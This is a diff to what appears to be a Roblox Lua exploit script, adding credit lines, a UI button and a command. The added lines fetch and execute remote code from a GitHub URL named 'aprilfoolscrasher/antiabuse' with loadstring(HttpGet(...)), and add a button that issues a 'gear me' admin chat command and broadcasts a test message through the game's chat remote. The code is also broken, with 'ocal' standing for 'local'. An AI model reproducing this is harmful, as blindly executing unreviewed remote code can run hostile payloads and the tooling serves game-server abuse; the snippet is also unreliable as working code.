@@ -226,3 +226,15 @@ print("AyItsDamixer (a friend and helper for the h in the middel of the screen)"
 print("xq12(a friend and idea giver)")
 print("cofead(the welcome message)")
 print("sirus ui lib maker")
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/aprilfoolscrasher/antiabuse/main/antiabuse"))();
+
+local Button = Tab:CreateButton({
+   Name = "testvampire",
+   Callback = function()
+      game.Players:Chat("gear me 94794847")
+      ocal function say(real)
+         game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(real,"All")
+     end
+     say("[Core V5]anti-crashVG test has worked")
+   end,
+})
